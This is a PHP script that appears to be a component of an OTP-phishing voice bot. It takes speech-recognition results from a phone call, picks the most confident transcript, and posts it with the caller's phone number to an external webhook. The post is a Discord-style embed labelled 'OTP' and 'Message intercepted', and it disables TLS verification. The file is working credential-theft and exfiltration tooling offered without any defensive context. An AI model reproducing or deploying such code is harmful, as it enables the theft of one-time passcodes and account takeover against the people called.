<?php
$postdata = file_get_contents("php://input");
$json = $postdata;
$data = json_decode($json, true);
$number = 'unknown';
$number = $data->to;
$highest_confidence = 0;
$highest_confidence_text = '';
foreach ($data['speech']['results'] as $result) {
    if ($result['confidence'] > $highest_confidence) {
        $highest_confidence = $result['confidence'];
        $highest_confidence_text = $result['text'];
    }
}
$url = "WEBHOOK";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = '{"content":null,"embeds":[{"title":"Paradox","description":"```Transcript📜: '.$highest_confidence_text.'```\n```OTP🔒: '.$highest_confidence_text.'```\n```Transcript Confidence🔎:  '.$highest_confidence.'```\n```Phone Number📱: '.$number.'```\n```Method📫: TALKING```","color":3819856,"author":{"name":"Message intercepted"}}],"attachments":[]}';
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
var_dump($resp);
?>
